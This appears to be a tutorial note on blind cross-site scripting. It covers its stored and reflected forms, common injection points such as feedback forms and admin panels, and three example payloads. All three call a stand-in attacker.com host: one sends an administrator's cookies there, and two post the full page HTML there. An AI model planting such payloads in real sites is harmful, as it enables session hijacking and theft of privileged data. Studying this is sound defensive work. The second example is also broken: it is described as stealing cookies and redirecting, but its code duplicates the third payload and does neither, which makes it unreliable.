**Blind Cross-Site Scripting (Blind XSS)** is a type of **Cross-Site Scripting (XSS)** attack where the attacker does not immediately see the result of the injected malicious code. The payload is injected into a web application, but the attacker won't observe its execution or the impact directly. Instead, the attacker relies on the fact that their payload will execute when an administrator, other privileged user, or some internal system processes the injected data later.

This form of XSS is dangerous because it can impact users with higher privileges, such as administrators, and is more difficult to detect for the attacker.

---

### Types of Blind XSS

1. **Stored Blind XSS**  
    Similar to **Stored XSS**, the payload is injected into a server-side storage (e.g., database or logs). However, the payload doesn't execute until an administrator or another system processes or views the data, making it "blind" to the attacker until it’s triggered.
    
2. **Reflected Blind XSS**  
    The injected payload is not immediately executed in the page viewed by the attacker but will be reflected when a different user (like an admin) views a report, log, or panel. The attacker typically can't see the payload execution but relies on it being triggered by an admin's actions.
    

---

### Common Attack Vectors for Blind XSS

1. **Feedback Forms**  
    An attacker injects malicious scripts into a feedback form. The administrator may later view the feedback from the form, causing the payload to execute.
    
2. **Search Bars/Logs**  
    The attacker submits a payload in a search bar or via an API, and the server stores it in a log or search result. When the administrator later reviews this log, the payload is executed in their browser.
    
3. **Admin Panels**  
    Payloads can be injected into fields visible to an admin panel. The script runs when the admin checks logs, records, or user inputs.
    
4. **User Profile Fields**  
    Malicious code can be inserted in a profile field or similar user input. The injected script only executes when viewed by someone with admin rights or another high-privileged user.
    

---
### Example Payloads for Blind XSS

1. **Stealing Cookies:**
In this example, the attacker uses an image with an invalid source. When an admin views the page containing this payload, the `onerror` event triggers and sends the admin's cookies to the attacker's server.
```html
<img src="x" onerror="fetch('http://attacker.com/log?cookie=' + document.cookie);">
```

2. **Redirecting Admin to Malicious Website:**
In this example, the attacker sends a request with the admin's cookies and redirects them to a malicious website.
```html
<script>
fetch('http://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify({ data: document.documentElement.innerHTML }),
    headers: { 'Content-Type': 'application/json' }
});
</script>
```

3. **Exfiltrating Data (e.g., from a page or an endpoint):**
This payload sends the entire page content to a malicious server controlled by the attacker.
```html
<script>
fetch('http://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify({ data: document.documentElement.innerHTML }),
    headers: { 'Content-Type': 'application/json' }
});
</script>
```

